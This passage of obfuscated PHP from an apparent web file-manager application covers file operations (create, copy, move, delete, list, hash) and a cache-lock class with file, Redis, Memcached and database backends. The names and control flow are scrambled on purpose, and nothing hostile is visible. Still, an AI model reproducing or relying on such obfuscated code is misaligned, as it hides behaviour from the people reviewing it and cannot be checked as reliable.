@touch($fÄÖÁ†«×»); if ($c”¤ÇƒÏ¡) { file_put_contents($fÄÖÁ†«×», $c”¤ÇƒÏ¡); } @chmod($fÄÖÁ†«×», $this->pathAuth); return is_file($fÄÖÁ†«×») ? $this->getPathOuter($fÄÖÁ†«×») : !1; } public function mkdir($B‹¦äòÔí§, $Dèù¢ëÁÛ = REPEAT_SKIP) { $B‹¦äòÔí§ = $this->iconvSystem($B‹¦äòÔí§); if (is_dir($B‹¦äòÔí§)) { return $this->getPathOuter($B‹¦äòÔí§); } @mkdir($B‹¦äòÔí§, $this->pathAuth, !0); @chmod($B‹¦äòÔí§, $this->pathAuth); return is_dir($B‹¦äòÔí§) ? $this->getPathOuter($B‹¦äòÔí§) : !1; } public function copyFile($bÖÈ¯åÛÎ, $cï¶­ç²É) { $this->mkdir($this->pathFather($cï¶­ç²É)); $bÖÈ¯åÛÎ = $this->iconvSystem($bÖÈ¯åÛÎ); $cï¶­ç²É = $this->iconvSystem($cï¶­ç²É); $BÀ¯†‰îŒ¶ = copy_64($bÖÈ¯åÛÎ, $cï¶­ç²É); @chmod($cï¶­ç²É, $this->pathAuth); return $BÀ¯†‰îŒ¶ ? $this->getPathOuter($cï¶­ç²É) : !1; } public function moveFile($B¾Î‚Òè‡ñ, $b òƒ‰á‡) { goto eÔçË¨îé; f¤Á‹ÍŒ‹„: return $c—“¸«Ã ? $this->getPathOuter($b òƒ‰á‡) : !1; goto b®„¿°ŒÙÚ; f…‡ùˆ¯™í: $c—“¸«Ã = intval(@rename($B¾Î‚Òè‡ñ, $b òƒ‰á‡)); if (!$c—“¸«Ã) { if ($c—“¸«Ã = intval(@copy_64($B¾Î‚Òè‡ñ, $b òƒ‰á‡))) { @unlink($B¾Î‚Òè‡ñ); } } @chmod($b òƒ‰á‡, $this->pathAuth); goto f¤Á‹ÍŒ‹„; eÔçË¨îé: $this->mkdir($this->pathFather($b òƒ‰á‡)); $B¾Î‚Òè‡ñ = $this->iconvSystem($B¾Î‚Òè‡ñ); $b òƒ‰á‡ = $this->iconvSystem($b òƒ‰á‡); goto f…‡ùˆ¯™í; b®„¿°ŒÙÚ: } public function delFile($bƒƒ¿ÀŠ´º) { $bƒƒ¿ÀŠ´º = $this->iconvSystem($bƒƒ¿ÀŠ´º); if (!@unlink($bƒƒ¿ÀŠ´º)) { @chmod($bƒƒ¿ÀŠ´º, $this->pathAuth); if (!@unlink($bƒƒ¿ÀŠ´º)) { return !1; } } else { return !0; } } public function delFolder($cïÆã‚íƒ) { goto CˆÊ‘«Èñš; aÛ‘äƒ„âº: return rmdir($cïÆã‚íƒ); goto C÷È…ÉĞš®; eœàÎğô‘…: if (!($b¿Ò‡—½È´ = opendir($cïÆã‚íƒ))) { return !1; } while (($e÷—æğí¼ = readdir($b¿Ò‡—½È´)) !== !1) { if ($e÷—æğí¼ == $b„İàè¼©…[95] || $e÷—æğí¼ == $b„İàè¼©…[1276]) { continue; } $FÎ÷Œ Œ = $cïÆã‚íƒ . $b„İàè¼©…[8] . $e÷—æğí¼; if (is_file($FÎ÷Œ Œ) || is_link($FÎ÷Œ Œ)) { if (!unlink($FÎ÷Œ Œ)) { chmod($FÎ÷Œ Œ, $this->pathAuth); if (!unlink($FÎ÷Œ Œ)) { return !1; } } } else { if (is_dir($FÎ÷Œ Œ)) { chmod($FÎ÷Œ Œ, $this->pathAuth); $FÎ÷Œ Œ = $this->iconvApp($FÎ÷Œ Œ); if (!$this->delFolder($FÎ÷Œ Œ)) { return !1; } } } } closedir($b¿Ò‡—½È´); goto aÛ‘äƒ„âº; CˆÊ‘«Èñš: $b„İàè¼©… =& $_SERVER[›èö’ù¤]; $cïÆã‚íƒ = $this->iconvSystem($cïÆã‚íƒ); if (!is_dir($cïÆã‚íƒ)) { return !0; } goto eœàÎğô‘…; C÷È…ÉĞš®: } public function rename($c·‚×÷‹—ø, $d¡Ğ¹ªª­Ê) { goto eÎë¥¢õè; eÎë¥¢õè: $dÍ…©­¹³¥ =& $_SERVER[›èö’ù¤]; $Eç­¼áŸ¶¾ = $this->fileNameAuto($this->pathFather($c·‚×÷‹—ø), $d¡Ğ¹ªª­Ê); $Eç­¼áŸ¶¾ = $this->iconvSystem($Eç­¼áŸ¶¾); goto bºÖ¹Úğñ; bºÖ¹Úğñ: $c·‚×÷‹—ø = $this->iconvSystem($c·‚×÷‹—ø); $eòå®ï«œ¹ = $this->pathFather($c·‚×÷‹—ø); $c„¹†ß› = rtrim($eòå®ï«œ¹, $dÍ…©­¹³¥[8]) . $dÍ…©­¹³¥[8] . $Eç­¼áŸ¶¾; goto F»ÎòÌ—÷; F»ÎòÌ—÷: $eçÊ÷Œ²ÃÊ = @rename($c·‚×÷‹—ø, $c„¹†ß›); $c„¹†ß› = $this->iconvApp($c„¹†ß›); return $eçÊ÷Œ²ÃÊ ? $this->getPathOuter($c„¹†ß›) : !1; goto dÙ†ŞæÄİ‡; dÙ†ŞæÄİ‡: } public function size($D‚ï”Œ‘á) { $D‚ï”Œ‘á = $this->iconvSystem($D‚ï”Œ‘á); return filesize_64($D‚ï”Œ‘á); } public function info($b…¥·ê¾Ú) { $b…¥·ê¾Ú = $this->iconvSystem($b…¥·ê¾Ú); if ($this->isFolder($b…¥·ê¾Ú)) { return $this->folderInfo($b…¥·ê¾Ú); } else { if ($this->isFile($b…¥·ê¾Ú)) { return $this->fileInfo($b…¥·ê¾Ú); } } return !1; } protected function infoChildren($b¯Î÷Š±‡ë, &$fÄÂŠ”˜, $eŒÓ¦çˆÙ = true) { goto f»‰—¾·Ë©; f»‰—¾·Ë©: $d¨ÂØ½Ş¨º =& $_SERVER[›èö’ù¤]; check_abort_echo(); $b¯Î÷Š±‡ë = rtrim($b¯Î÷Š±‡ë, $d¨ÂØ½Ş¨º[8]) . $d¨ÂØ½Ş¨º[8]; goto fºÕË§‘Ù; fºÕË§‘Ù: if ($eŒÓ¦çˆÙ) { $b¯Î÷Š±‡ë = $this->iconvSystem($b¯Î÷Š±‡ë); } if (!($fŸÄ›·“‘ = @opendir($b¯Î÷Š±‡ë))) { return; } while (($B²ŠÂ…öŠº = readdir($fŸÄ›·“‘)) !== !1) { if ($B²ŠÂ…öŠº == $d¨ÂØ½Ş¨º[95] || $B²ŠÂ…öŠº == $d¨ÂØ½Ş¨º[1276]) { continue; } $DÙç×ïã‘‡ = $b¯Î÷Š±‡ë . $B²ŠÂ…öŠº; if (is_file($DÙç×ïã‘‡) || is_link($DÙç×ïã‘‡)) { $fÄÂŠ”˜[$d¨ÂØ½Ş¨º[79]]++; $fÄÂŠ”˜[$d¨ÂØ½Ş¨º[78]] += filesize_64($DÙç×ïã‘‡); } else { if (is_dir($DÙç×ïã‘‡)) { $fÄÂŠ”˜[$d¨ÂØ½Ş¨º[80]]++; $this->infoChildren($DÙç×ïã‘‡, $fÄÂŠ”˜, !1); } } } goto AË¾ãß«â«; AË¾ãß«â«: closedir($fŸÄ›·“‘); goto b…­˜çì¡Ş; b…­˜çì¡Ş: } private function folderInfo($eŞæˆ¾·Ã, $fñ±îñ‰µã = false) { $EÛô¿ÈÂ†× =& $_SERVER[›èö’ù¤]; $eŞæˆ¾·Ã = rtrim($eŞæˆ¾·Ã, $EÛô¿ÈÂ†×[8]) . $EÛô¿ÈÂ†×[8]; $CƒÁ½±Ş¾ = $this->iconvApp($this->pathThis($eŞæˆ¾·Ã)); if ($fñ±îñ‰µã) { return array($EÛô¿ÈÂ†×[28] => $CƒÁ½±Ş¾, $EÛô¿ÈÂ†×[76] => $this->getPathOuter($eŞæˆ¾·Ã), $EÛô¿ÈÂ†×[29] => $EÛô¿ÈÂ†×[77]); } $E’¦Äé·ê = array($EÛô¿ÈÂ†×[28] => $CƒÁ½±Ş¾, $EÛô¿ÈÂ†×[76] => $this->getPathOuter($eŞæˆ¾·Ã), $EÛô¿ÈÂ†×[29] => $EÛô¿ÈÂ†×[77], $EÛô¿ÈÂ†×[194] => @filectime($eŞæˆ¾·Ã), $EÛô¿ÈÂ†×[84] => @filemtime($eŞæˆ¾·Ã), $EÛô¿ÈÂ†×[1279] => @fileatime($eŞæˆ¾·Ã), $EÛô¿ÈÂ†×[1280] => is_readable($eŞæˆ¾·Ã), $EÛô¿ÈÂ†×[1281] => is_writable($eŞæˆ¾·Ã), $EÛô¿ÈÂ†×[1282] => get_mode($eŞæˆ¾·Ã)); return $E’¦Äé·ê; } private function fileInfo($d¿Èïö³è‡, $b‹ø‘ŸÊÚ = false) { $fóéğ˜•Ü =& $_SERVER[›èö’ù¤]; $EÀ¬ŠÇÓì = $this->iconvApp($this->pathThis($d¿Èïö³è‡)); if ($b‹ø‘ŸÊÚ) { return array($fóéğ˜•Ü[28] => $EÀ¬ŠÇÓì, $fóéğ˜•Ü[76] => $this->getPathOuter($d¿Èïö³è‡), $fóéğ˜•Ü[29] => $fóéğ˜•Ü[193], $fóéğ˜•Ü[78] => $this->size($d¿Èïö³è‡), $fóéğ˜•Ü[168] => $this->ext($EÀ¬ŠÇÓì)); } $F…Ç§õÔœ = array($fóéğ˜•Ü[28] => $EÀ¬ŠÇÓì, $fóéğ˜•Ü[76] => $this->getPathOuter($d¿Èïö³è‡), $fóéğ˜•Ü[29] => $fóéğ˜•Ü[193], $fóéğ˜•Ü[194] => @filectime($d¿Èïö³è‡), $fóéğ˜•Ü[84] => @filemtime($d¿Èïö³è‡), $fóéğ˜•Ü[1279] => @fileatime($d¿Èïö³è‡), $fóéğ˜•Ü[78] => $this->size($d¿Èïö³è‡), $fóéğ˜•Ü[168] => $this->ext($EÀ¬ŠÇÓì), $fóéğ˜•Ü[1280] => is_readable($d¿Èïö³è‡), $fóéğ˜•Ü[1281] => is_writable($d¿Èïö³è‡), $fóéğ˜•Ü[1282] => get_mode($d¿Èïö³è‡)); return $F…Ç§õÔœ; } public function exist($eÏ™áÑ£†ğ) { $eÏ™áÑ£†ğ = $this->iconvSystem($eÏ™áÑ£†ğ); return @file_exists($eÏ™áÑ£†ğ); } public function isFile($cĞ™í­˜¨Ü) { $cĞ™í­˜¨Ü = $this->iconvSystem($cĞ™í­˜¨Ü); return @is_file($cĞ™í­˜¨Ü); } public function isFolder($E¿¦ÊÓ¸÷„) { $E¿¦ÊÓ¸÷„ = $this->iconvSystem($E¿¦ÊÓ¸÷„); return @is_dir($E¿¦ÊÓ¸÷„); } public function listPath($fßØÆç‘, $FØ·°ÌÃ¢ä = false) { goto D¥°Œµ§„µ; c¡óîñ ¬é: closedir($A¤ÊİÒÏé¸); return $CÈĞ¾Ó™İ ; goto F†èàŸÓ…ã; D¥°Œµ§„µ: $fìáª­ÛĞÃ =& $_SERVER[›èö’ù¤]; $fßØÆç‘ = $this->iconvSystem($fßØÆç‘); $fßØÆç‘ = rtrim($fßØÆç‘, $fìáª­ÛĞÃ[8]) . $fìáª­ÛĞÃ[8]; goto dõèñÚ¦•; dõèñÚ¦•: $CÈĞ¾Ó™İ  = array($fìáª­ÛĞÃ[75] => array(), $fìáª­ÛĞÃ[74] => array()); if (!($A¤ÊİÒÏé¸ = @opendir($fßØÆç‘))) { return $CÈĞ¾Ó™İ ; } while (($aÆó¢‡Äå» = readdir($A¤ÊİÒÏé¸)) !== !1) { if ($aÆó¢‡Äå» == $fìáª­ÛĞÃ[95] || $aÆó¢‡Äå» == $fìáª­ÛĞÃ[1276]) { continue; } $d¥«øÕñ¸’ = $fßØÆç‘ . $aÆó¢‡Äå»; if (is_file($d¥«øÕñ¸’)) { $CÈĞ¾Ó™İ [$fìáª­ÛĞÃ[74]][] = $this->fileInfo($d¥«øÕñ¸’, $FØ·°ÌÃ¢ä); } else { $CÈĞ¾Ó™İ [$fìáª­ÛĞÃ[75]][] = $this->folderInfo($d¥«øÕñ¸’, $FØ·°ÌÃ¢ä); } } goto c¡óîñ ¬é; F†èàŸÓ…ã: } public function listAll($bæ±¦Ê³Í, &$Fö·—‚ºŠƒ = array()) { goto AÖ´î·ã ì; fÇ´¨‹Î: return $Fö·—‚ºŠƒ; goto A”É¨ÃåÙ; AÖ´î·ã ì: $Cğ¶Û¾¥¾ =& $_SERVER[›èö’ù¤]; $bæ±¦Ê³Í = $this->iconvSystem($bæ±¦Ê³Í); $bæ±¦Ê³Í = rtrim($bæ±¦Ê³Í, $Cğ¶Û¾¥¾[8]) . $Cğ¶Û¾¥¾[8]; goto B‰ÂÙ¹©Öğ; B‰ÂÙ¹©Öğ: if (!($f£ÄìŞÄù¤ = @opendir($bæ±¦Ê³Í))) { return $Fö·—‚ºŠƒ; } while (($f»ãÌÏ™‡ = readdir($f£ÄìŞÄù¤)) !== !1) { if ($f»ãÌÏ™‡ == $Cğ¶Û¾¥¾[95] || $f»ãÌÏ™‡ == $Cğ¶Û¾¥¾[1276]) { continue; } $fçÈ”õŒÑŞ = $bæ±¦Ê³Í . $f»ãÌÏ™‡; if (is_dir($fçÈ”õŒÑŞ) && !is_link($fçÈ”õŒÑŞ)) { $Fö·—‚ºŠƒ[] = array($Cğ¶Û¾¥¾[76] => $fçÈ”õŒÑŞ . $Cğ¶Û¾¥¾[8], $Cğ¶Û¾¥¾[77] => 1, $Cğ¶Û¾¥¾[84] => @filemtime($fçÈ”õŒÑŞ), $Cğ¶Û¾¥¾[78] => 0); $this->listAll($fçÈ”õŒÑŞ, $Fö·—‚ºŠƒ); } else { $Fö·—‚ºŠƒ[] = array($Cğ¶Û¾¥¾[76] => $fçÈ”õŒÑŞ, $Cğ¶Û¾¥¾[77] => 0, $Cğ¶Û¾¥¾[84] => @filemtime($fçÈ”õŒÑŞ), $Cğ¶Û¾¥¾[78] => $this->size($fçÈ”õŒÑŞ)); } } closedir($f£ÄìŞÄù¤); goto fÇ´¨‹Î; A”É¨ÃåÙ: } public function has($EØ¿òšÊ, $c‰ùÕÕÛÔ = false, $eâÜ™†øÔ = true) { goto D¤âê¸Ó; D¤âê¸Ó: $d­ºİ½Ó =& $_SERVER[›èö’ù¤]; $EØ¿òšÊ = $this->iconvSystem($EØ¿òšÊ); $EØ¿òšÊ = rtrim($EØ¿òšÊ, $d­ºİ½Ó[8]) . $d­ºİ½Ó[8]; goto d»‘ÙœÙö; dÈÒ†ƒ¥Ø´: if ($c‰ùÕÕÛÔ) { return array($d­ºİ½Ó[203] => $bÀßáŒº„¯, $d­ºİ½Ó[204] => $CÔæ£‹²Ï); } return !1; goto bØÕğèÓ‰å; d»‘ÙœÙö: if (!($Fµùš’è‘´ = @opendir($EØ¿òšÊ))) { return !1; } $bÀßáŒº„¯ = 0; $CÔæ£‹²Ï = 0; goto cõçˆŞø‰™; cõçˆŞø‰™: $dòŒ…ÜõÍ = 0; while (($aè·»Ó¬åœ = readdir($Fµùš’è‘´)) !== !1) { if ($aè·»Ó¬åœ == $d­ºİ½Ó[95] || $aè·»Ó¬åœ == $d­ºİ½Ó[1276]) { continue; } $fÅ˜ØÚ‡¾ = $EØ¿òšÊ . $aè·»Ó¬åœ; if ($c‰ùÕÕÛÔ) { $dòŒ…ÜõÍ++; if (@is_file($fÅ˜ØÚ‡¾)) { $bÀßáŒº„¯++; } else { $CÔæ£‹²Ï++; } if ($dòŒ…ÜõÍ > 10000) { break; } continue; } if ($eâÜ™†øÔ) { if (@is_file($fÅ˜ØÚ‡¾)) { return !0; } } else { if (@is_dir($fÅ˜ØÚ‡¾ . $d­ºİ½Ó[8])) { return !0; } } } closedir($Fµùš’è‘´); goto dÈÒ†ƒ¥Ø´; bØÕğèÓ‰å: } public function hashSimple($BªÈ¿ÔÜø±) { goto D¤¢‡ºÆëÒ; D˜‹˜®õ¿¢: fseek_64($A¸‚Ò‰õôË, $c¡“–˜ŠÉÉ - $b½¢¾ß‹ÅŒ); $bäóù¯¥ò .= fread($A¸‚Ò‰õôË, $b½¢¾ß‹ÅŒ); fclose($A¸‚Ò‰õôË); goto cÁóá”¥“Ï; D¤¢‡ºÆëÒ: $a­Ü÷§˜ô¨ =& $_SERVER[›èö’ù¤]; if (!$BªÈ¿ÔÜø±) { return md5($a­Ü÷§˜ô¨[33]); } $BªÈ¿ÔÜø± = $this->iconvSystem($BªÈ¿ÔÜø±); goto b»æ¦ñÂî°; DÛ£ğ”Ş¹ : if ($c¡“–˜ŠÉÉ <= $b½¢¾ß‹ÅŒ * $fÑ‹ƒ‡Ÿ) { return $this->hashMd5($BªÈ¿ÔÜø±) . $c¡“–˜ŠÉÉ; } $bäóù¯¥ò = $a­Ü÷§˜ô¨[33]; $f¡‘†”¬ = intval($c¡“–˜ŠÉÉ / $fÑ‹ƒ‡Ÿ); goto B§Îª×ÛàŠ; B§Îª×ÛàŠ: $A¸‚Ò‰õôË = fopen($BªÈ¿ÔÜø±, $a­Ü÷§˜ô¨[1283]); if (!$A¸‚Ò‰õôË) { return $bäóù¯¥ò; } for ($a¾ÏÎ Ë‚Ş = 0; $a¾ÏÎ Ë‚Ş < $fÑ‹ƒ‡Ÿ; $a¾ÏÎ Ë‚Ş++) { fseek_64($A¸‚Ò‰õôË, $f¡‘†”¬ * $a¾ÏÎ Ë‚Ş); $bäóù¯¥ò .= fread($A¸‚Ò‰õôË, $b½¢¾ß‹ÅŒ); } goto D˜‹˜®õ¿¢; cÁóá”¥“Ï: return md5($bäóù¯¥ò) . $c¡“–˜ŠÉÉ; goto fƒËÓÆœ¥Ğ; b»æ¦ñÂî°: $c¡“–˜ŠÉÉ = $this->size($BªÈ¿ÔÜø±); $b½¢¾ß‹ÅŒ = 200; $fÑ‹ƒ‡Ÿ = 50; goto DÛ£ğ”Ş¹ ; fƒËÓÆœ¥Ğ: } public function getContent($fß–Œº†Â§) { $fß–Œº†Â§ = $this->iconvSystem($fß–Œº†Â§); return file_get_contents($fß–Œº†Â§); } public function setContent($aíÕ…¬œ·¡, $DÜ†˜¶º¦½ = '') { $aíÕ…¬œ·¡ = $this->iconvSystem($aíÕ…¬œ·¡); $E ¯ÒÜĞ­¬ = @file_put_contents($aíÕ…¬œ·¡, $DÜ†˜¶º¦½, LOCK_EX); clearstatcache(); @chmod($aíÕ…¬œ·¡, $this->pathAuth); return $E ¯ÒÜĞ­¬ === !1 ? !1 : !0; } public function fileSubstr($f™Š•Äœ‘İ, $dÀÁ¨ÁõÇŒ = 0, $bÏğÆÏ‚ˆË = false) { goto c‡™¢¬Éİ½; c‡™¢¬Éİ½: $AÈÀÆ£„é¿ =& $_SERVER[›èö’ù¤]; $f™Š•Äœ‘İ = $this->iconvSystem($f™Š•Äœ‘İ); if ($bÏğÆÏ‚ˆË === !1) { $bÏğÆÏ‚ˆË = $this->size($f™Š•Äœ‘İ); } goto B§âÊìİô™; eöù…Œë÷ì: fseek_64($Eîˆ¼­‡˜, $dÀÁ¨ÁõÇŒ); $cô •¦‰«Ğ = fread($Eîˆ¼­‡˜, $bÏğÆÏ‚ˆË); fclose($Eîˆ¼­‡˜); goto Cùæ™—ƒÛç; B§âÊìİô™: if ($bÏğÆÏ‚ˆË <= 0) { return $AÈÀÆ£„é¿[33]; } $Eîˆ¼­‡˜ = fopen($f™Š•Äœ‘İ, $AÈÀÆ£„é¿[1283]); if (!$Eîˆ¼­‡˜) { return !1; } goto eöù…Œë÷ì; Cùæ™—ƒÛç: return $cô •¦‰«Ğ; goto ešŠöáƒ; ešŠöáƒ: } public function upload($a£áÄ™àä, $EÄ¬ˆ¨Ì‹®, $bÒÄªœñƒ = false, $d²£¹¯Ûœê = REPEAT_REPLACE) { if ($bÒÄªœñƒ) { return $this->moveFile($EÄ¬ˆ¨Ì‹®, $a£áÄ™àä); } return $this->copyFile($EÄ¬ˆ¨Ì‹®, $a£áÄ™àä); } public function setModifyTime($cà••™£ , $dŒ¯ñë×âÌ = '') { @touch($cà••™£ , intval($dŒ¯ñë×âÌ)); } public function download($E¸Úõ­ç¦ğ, $bœ‚ä¶õ¿õ) { return $this->iconvSystem($E¸Úõ­ç¦ğ); } } goto EÃè—¨ìëŠ; aÊêö‚ƒ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto Aª’‘´Œ®Š; AİŸ¢»œĞ: if ($Aä‹ğ¥©Š == $fˆ„–à¾ôò[17] && $A»ÛÕ‹Ã™ == $fˆ„–à¾ôò[9]) { $Aä‹ğ¥©Š = $fˆ„–à¾ôò[193]; } switch ($Aä‹ğ¥©Š) { case $fˆ„–à¾ôò[821]: self::$handle = new CacheLockRedis(); break; case $fˆ„–à¾ôò[822]: self::$handle = new CacheLockMemcached(); break; case $fˆ„–à¾ôò[17]: self::$handle = new CacheLockDatabase(); break; case $fˆ„–à¾ôò[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto b­·Ù¯Û·; bªçÂ–†º: self::$timeout = $fÛ´¸ŸÉºœ[$fˆ„–à¾ôò[838]] ? $fÛ´¸ŸÉºœ[$fˆ„–à¾ôò[838]] : 10; $A»ÛÕ‹Ã™ = _get($GLOBALS[$fˆ„–à¾ôò[6]], $fˆ„–à¾ôò[839]); $Aä‹ğ¥©Š = $fÛ´¸ŸÉºœ[$fˆ„–à¾ôò[818]] ? $fÛ´¸ŸÉºœ[$fˆ„–à¾ôò[818]] : $fˆ„–à¾ôò[193]; goto AİŸ¢»œĞ; Aª’‘´Œ®Š: $fˆ„–à¾ôò =& $_SERVER[›èö’ù¤]; if (self::$handle) { return self::$handle; } $fÛ´¸ŸÉºœ = $GLOBALS[$fˆ„–à¾ôò[6]][$fˆ„–à¾ôò[347]]; goto bªçÂ–†º; b­·Ù¯Û·: } private static function key($a…Ç¼Ÿß†§) { return $_SERVER[›èö’ù¤][840] . Cache::key($a…Ç¼Ÿß†§); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($bí·ßõ¢Ø… = '') { self::$errorMsg = $bí·ßõ¢Ø…; } public static function lockGlobal($A¥«‰›Šò™, $FÒ¡Š»¯¬È) { return self::lock($A¥«‰›Šò™, $FÒ¡Š»¯¬È, !0); } public static function lock($AÕõò—´, $C¿Ç—Ñ—ë† = false, $b«Ñ×ö‡ãÈ = false) { goto B°‹ã«ß¨; B°‹ã«ß¨: $f÷¤…ñ =& $_SERVER[›èö’ù¤]; $E†í Â¡‹Í = self::init(); $C ¸ò²¸ñ = self::key($AÕõò—´); goto BÄà—²ÆÌÆ; DÔó„‹•ÂÆ: if (!$b«Ñ×ö‡ãÈ) { self::$lockItem[$C ¸ò²¸ñ] = !0; } return $FÂˆ†ÂÉˆÇ; goto a™„…ãÁŒ˜; BÄà—²ÆÌÆ: $C¿Ç—Ñ—ë† = $C¿Ç—Ñ—ë† ? $C¿Ç—Ñ—ë† : self::$timeout; $FÂˆ†ÂÉˆÇ = $E†í Â¡‹Í->lock($C ¸ò²¸ñ, $C¿Ç—Ñ—ë†); if (!$FÂˆ†ÂÉˆÇ) { $cÌƒÊ‚¦ùË = "\154\157\x63\x6b\40\145\162\x72\157\162\x3b\153\145\171\75{$AÕõò—´}\73\x74\151\155\145\x3d{$C¿Ç—Ñ—ë†}\x3b" . self::$errorMsg . $f÷¤…ñ[68] . get_caller_msg(); $E –´è‡‚Ø = LNG($f÷¤…ñ[841]) . "\x28{$C¿Ç—Ñ—ë†}\x73\51\56" . LNG($f÷¤…ñ[842]); $E –´è‡‚Ø .= $f÷¤…ñ[843]; if (is_string(self::$errorMsg) && self::$errorMsg) { $E –´è‡‚Ø = $E –´è‡‚Ø . $f÷¤…ñ[844] . self::$errorMsg; } write_log($cÌƒÊ‚¦ùË, $f÷¤…ñ[845]); show_json($E –´è‡‚Ø, !1); } goto DÔó„‹•ÂÆ; a™„…ãÁŒ˜: } public static function lockGet($F»òïö«•×) { $DÉ½¯»ĞÑ‰ = self::key($F»òïö«•×); if (self::$lockItem[$DÉ½¯»ĞÑ‰]) { return self::$lockItem[$DÉ½¯»ĞÑ‰]; } return self::init()->lockGet($DÉ½¯»ĞÑ‰); } public static function unlock($d‚‹‚Ìíß) { $b³İÄŒÓ­Ì = self::key($d‚‹‚Ìíß); self::$lockItem[$b³İÄŒÓ­Ì] = null; return self::init()->unlock($b³İÄŒÓ­Ì); } public static function unlockRuntime() { $AÄê®İ =& $_SERVER[›èö’ù¤]; $EÈõ†‡ŠŞè = self::init(); $dª…±Ò–ê’ = !1; foreach (self::$lockItem as $EİíÕåïïº => $eÈäĞ•Ş­è) { if (!$eÈäĞ•Ş­è) { continue; } $EÈõ†‡ŠŞè->unlock($EİíÕåïïº); if (!$dª…±Ò–ê’) { $dª…±Ò–ê’ = !0; write_log($AÄê®İ[846] . $EİíÕåïïº . $AÄê®İ[68] . get_caller_msg(), $AÄê®İ[845]); continue; } write_log($AÄê®İ[846] . $EİíÕåïïº, $AÄê®İ[845]); } self::fileUnlockAll(); } public static function fileLock($bÑ¢„ÆË¦É) { goto Fî÷Ïçßƒ; A¹•…¬÷Å: return !1; goto EªçÑÚ¬Ä‰; Fî÷Ïçßƒ: $Cõœ Ğ©ø… =& $_SERVER[›èö’ù¤]; if (!$GLOBALS[$Cõœ Ğ©ø…[847]]) { $GLOBALS[$Cõœ Ğ©ø…[847]] = array(); } $GLOBALS[$Cõœ Ğ©ø…[847]][$bÑ¢„ÆË¦É] = !1; goto b»ğÓ‹Âå; Bå®°£†ãó: if (flock($FÁƒŠ§ù†–, LOCK_EX)) { return !0; } self::unlock($bÑ¢„ÆË¦É); show_json($Cõœ Ğ©ø…[850], !1); goto A¹•…¬÷Å; b»ğÓ‹Âå: $FÁƒŠ§ù†– = fopen(DATA_PATH . $bÑ¢„ÆË¦É . $Cõœ Ğ©ø…[848], $Cõœ Ğ©ø…[849]); if (!$FÁƒŠ§ù†–) { return !1; } $GLOBALS[$Cõœ Ğ©ø…[847]][$bÑ¢„ÆË¦É] = $FÁƒŠ§ù†–; goto Bå®°£†ãó; EªçÑÚ¬Ä‰: } public static function fileUnlock($AĞ‚ÀŸÆô) { $E İ›¼ƒ =& $_SERVER[›èö’ù¤]; $cÇ— ¤ğñ‰ = $GLOBALS[$E İ›¼ƒ[847]][$AĞ‚ÀŸÆô]; if (!$cÇ— ¤ğñ‰) { return; } $GLOBALS[$E İ›¼ƒ[847]][$AĞ‚ÀŸÆô] = !1; flock($cÇ— ¤ğñ‰, LOCK_UN); fclose($cÇ— ¤ğñ‰); } public static function fileUnlockAll() { $C½Í˜ÛŞ— =& $_SERVER[›èö’ù¤]; if (!$GLOBALS[$C½Í˜ÛŞ—[847]]) { return; } foreach ($GLOBALS[$C½Í˜ÛŞ—[847]] as $f­©ÌÏáß¡ => $FŠ‚Õ¨ĞÊ) { if (!$FŠ‚Õ¨ĞÊ) { continue; } $GLOBALS[$C½Í˜ÛŞ—[847]][$f­©ÌÏáß¡] = !1; flock($FŠ‚Õ¨ĞÊ, LOCK_UN); fclose($FŠ‚Õ¨ĞÊ); } $GLOBALS[$C½Í˜ÛŞ—[847]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $e«†¬¹¶İ¦ =& $_SERVER[›èö’ù¤]; $f•µò×½Òå = $GLOBALS[$e«†¬¹¶İ¦[6]][$e«†¬¹¶İ¦[347]]; self::$cachePath = $f•µò×½Òå[$e«†¬¹¶İ¦[193]][$e«†¬¹¶İ¦[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($b¨Œùò³„Ù, $C„ëÖ‰ê¬‰ = 0) { goto a¹‘¢§Ğ¼Ì; D‡ôÌŞÈ: $báŒ™İ™…‘ = rtrim(self::$cachePath, $c›Ÿ†Ó…ÄÛ[8]) . $c›Ÿ†Ó…ÄÛ[851] . md5($b¨Œùò³„Ù) . $c›Ÿ†Ó…ÄÛ[848]; if (file_exists($báŒ™İ™…‘) && filemtime($báŒ™İ™…‘) && filemtime($báŒ™İ™…‘) < time() - 10) { @unlink($báŒ™İ™…‘); } do { if (file_exists($báŒ™İ™…‘)) { cacheLockWait(); continue; } $a›¸ÖÕøøƒ = fopen($báŒ™İ™…‘, $c›Ÿ†Ó…ÄÛ[852]); if (!$a›¸ÖÕøøƒ) { return !1; } $FäÅ‰Åàâ = flock($a›¸ÖÕøøƒ, LOCK_EX | LOCK_NB); self::$caches[$b¨Œùò³„Ù] = array($c›Ÿ†Ó…ÄÛ[853] => $a›¸ÖÕøøƒ, $c›Ÿ†Ó…ÄÛ[193] => $báŒ™İ™…‘); fwrite($a›¸ÖÕøøƒ, $Eã¥Ñì‘‚Ô); clearstatcache(); if ($a›¸ÖÕøøƒ && $FäÅ‰Åàâ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Eã¥Ñì‘‚Ô); goto FÕ”ìïô·Û; FÕ”ìïô·Û: $this->unlock($b¨Œùò³„Ù); return !1; goto eÍ¤³Ğê; a¹‘¢§Ğ¼Ì: $c›Ÿ†Ó…ÄÛ =& $_SERVER[›èö’ù¤]; $F óÁËœÜ = microtime(!0); $Eã¥Ñì‘‚Ô = $F óÁËœÜ + $C„ëÖ‰ê¬‰ + 0.0001; goto D‡ôÌŞÈ; eÍ¤³Ğê: } public function lockGet($B‹ÍÙ–¶™‰) { $d¤µ¦ë¾ò =& $_SERVER[›èö’ù¤]; $e»™ØÇô = rtrim(self::$cachePath, $d¤µ¦ë¾ò[8]) . $d¤µ¦ë¾ò[851] . md5($B‹ÍÙ–¶™‰) . $d¤µ¦ë¾ò[848]; return file_exists($e»™ØÇô); } public function unlock($Aå®…ˆ Ä) { goto C……ƒ¸µÕç; dèº¬±º: unset(self::$caches[$Aå®…ˆ Ä]); goto e±ÃßñšÉ; C……ƒ¸µÕç: $F–À³ï»Ò =& $_SERVER[›èö’ù¤]; $c‹ô­»ŞÀ¼ = self::$caches[$Aå®…ˆ Ä]; if (!$c‹ô­»ŞÀ¼) { return; } goto bªğê¡Ôã¯; 